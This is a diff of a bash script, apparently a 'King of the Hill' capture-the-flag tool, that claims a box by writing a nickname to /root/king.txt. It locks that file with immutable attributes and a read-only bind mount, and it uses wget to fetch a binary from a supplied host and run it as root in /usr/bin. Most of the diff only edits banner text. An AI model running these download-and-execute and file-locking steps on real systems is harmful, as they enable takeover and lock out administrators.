@@ -13,12 +13,7 @@ if [[ $(id -u) -ne 0 ]]; then
 else
     echo -e "${GREEN}You have root privileges. Continuing with the script...${RESET}"
 fi
-echo
-echo -e "${GREEN}Hi, I am The KOTH Script ... I have been created by H3X-007 to make sure you are the KING :)${RESET}"
-echo
-echo -e "Join our Discord Server: ${YELLOW}https://discord.gg/568RgwjZYk${RESET}"
-echo
-echo "-----------------------------------------------------------------------------"
+echo -e "${GREEN}-----------------------------Created by H3X-007 :)-----------------------------${RESET}"
 
 IP="$1"
 nick="$2"
@@ -30,7 +25,6 @@ sudo chattr -ai /root/king.txt
 echo "$nick" > /root/king.txt
 sudo chmod 400 /root/king.txt
 sudo chattr +ai /root/king.txt
-set -o noclobber /root/king.txt
 sudo mount --bind -o ro /root/king.txt /root/king.txt
 
 cd /usr/bin && wget http://$IP/check && chmod +x check && ./check "$nick" &
@@ -45,5 +39,5 @@ cd /usr/bin && put +ai chattr
 
 echo -e "${GREEN}Operation Fully Complete. The KING is $nick! :)${RESET}"
 echo
-echo -e "${BLUE}-------------- Hi $nick, don't forget to give us a star on GitHub --------------${RESET}"
+echo -e "${BLUE}-------------- Hi $nick, don't forget to give me a star on GitHub --------------${RESET}"
 echo -e "${BLUE}--------------------------------------------------------------------------------${RESET}"
